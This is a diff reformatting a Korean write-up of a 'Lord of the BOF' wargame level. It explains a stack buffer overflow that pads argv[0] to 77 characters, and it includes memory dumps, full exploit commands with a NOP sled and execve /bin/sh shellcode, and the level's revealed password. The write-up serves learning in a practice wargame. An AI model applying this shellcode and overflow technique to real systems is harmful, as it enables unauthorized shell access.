@@ -5,7 +5,8 @@ tags: [stack buffer overflow]
 ---
 
 ## darkelf
----
+<hr style="border-top: 1px solid;"><br>
+
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -57,23 +58,45 @@ main(int argc, char *argv[])
         memset(buffer, 0, 40);
 }
 ```
-<br>
-<br>
+
+<br><br>
+<hr style="border: 2px solid;">
+<br><br>
 
 ## Solution
----
-wolfman과 다른점은 코드를 보면 argv[0]의 길이가 77이어야 한다. argv[0]은 파일경로임. argv[0]을 출력해보려고 file 실행파일을 만들어서 보니 argv[0]: ./file 이라고 나옴.  
-그런데 Linux에서는 .////////file 이렇게 해도 실행이 되고 argv[0]도 그럼 .////////file 이렇게 나올거임. 이를 이용해서 문제를 해결.  
-  
-[+] 다른 풀이법은 pwd는 파일경로를 보여주는 명령어로 보면 /home/darkelf 이렇게 나옴. 여기서 폴더를 만들어서 옮겨주면 경로는 /home/darkelf/폴더 이렇게 될꺼임.  
-즉, argv[0]은 /home/darkelf/폴더명/orge **(.은 현재폴더라는 뜻이라서 이때는 안씀)** 이렇게 되므로 폴더명 길이는 77-19(/home/darkelf/(14) + /orge(5)) = 58이 되게 만들어서 풀면 됨.  
+<hr style="border-top: 1px solid;"><br>
 
-```.+'/'*72+orge(4)=77 -> .////////////////////////////////////////////////////////////////////////orge```
+wolfman과 다른점은 코드를 보면 ```argv[0]```의 길이가 77이어야 한다.
+: ```argv[0]```은 파일경로임.
 
-우선 test파일을 만들어서 argv[2] 주소를 보면 0xbffffb24부터 값이 들어가 있음. 리턴주소로 0xbffffb30으로 하겠음.
+```argv[0]```을 출력해보려고 file 실행파일을 만들어서 보니 ```argv[0]: ./file``` 이라고 나옴.
 
-```
+<br>
+
+그런데 Linux에서는 ```.////////file``` 이렇게 해도 실행이 되고 ```argv[0]```도 그럼 ```.////////file``` 이렇게 나올거임. 
+
+이를 이용해서 문제를 해결.
+
+<br>
+
+다른 풀이법은 pwd 명령어로 보면 ```/home/darkelf``` 이렇게 나옴. 
+
+여기서 폴더를 만들어서 옮겨주면 경로는 ```/home/darkelf/폴더``` 이렇게 될꺼임.
+
+즉, ```argv[0]```은 ```/home/darkelf/폴더명/orge```가 되므로, 폴더명 길이는 ```77-19(/home/darkelf/(14) + /orge(5)) = 58```이 되게 만들어서 풀면 됨.  
+: ```. + '/'*72 + orge(4) = 77 ---> .////////////////////////////////////////////////////////////////////////orge```
+
+<br>
+
+우선 test파일을 만들어서 ```argv[2]``` 주소를 보면 ```0xbffffb24```부터 값이 들어가 있음. 
+
+리턴주소로 ```0xbffffb30```으로 하겠음.
+
+<br>
+
+```shell
 .////////////////////////////////////////////////////////////////////////test `python -c 'print "A"*44+"BBB\xbf"'` `python -c 'print "C"*100'`
+
 0xbffffaf0:     0x00747365      0x41414141      0x41414141      0x41414141
 0xbffffb00:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffb10:     0x41414141      0x41414141      0x41414141      0x41414141
@@ -85,10 +108,18 @@ wolfman과 다른점은 코드를 보면 argv[0]의 길이가 77이어야 한다
 0xbffffb70:     0x43434343      0x43434343      0x43434343      0x43434343
 0xbffffb80:     0x43434343      0x43434343      0x00000043      0x00000000
 0xbffffb90:     0x00000000      0x00000000      0x00000000      0x00000000
-``` 
-Segmentation fault (core dump)가 되서 다시 확인해보니 리턴주소가 달라져서 다시 설정함. 0xbffffb3c
 ```
+
+<br>
+
+```Segmentation fault (core dump)```가 되서 다시 확인해보니, 리턴주소가 달라져서 다시 설정함. 
+: ```0xbffffb3c```
+
+<br>
+
+```shell
 .////////////////////////////////////////////////////////////////////////test `python -c 'print "A"*44+"\x80\xfb\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+
 0xbffffacc:     0x2f2f2f2f      0x2f2f2f2f      0x65742f2f      0x41007473
 0xbffffadc:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffaec:     0x41414141      0x41414141      0x41414141      0x41414141
@@ -101,12 +132,25 @@ Segmentation fault (core dump)가 되서 다시 확인해보니 리턴주소가 
 0xbffffb5c:     0x90909090      0x90909090      0x90909090      0x90909090
 0xbffffb6c:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
 ```
+
+<br>
+
 바꾼 주소로 해보니 잘 되서 실제파일에도 공격해서 성공.
-```
+
+<br>
+
+```shell
 .////////////////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x3c\xfb\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<▒▒▒
 bash$ my-pass
 euid = 507
 timewalker
 ```
+
+<br>
+
 my-pass : timewalker
+
+<br><br>
+<hr style="border: 2px solid;">
+<br><br>
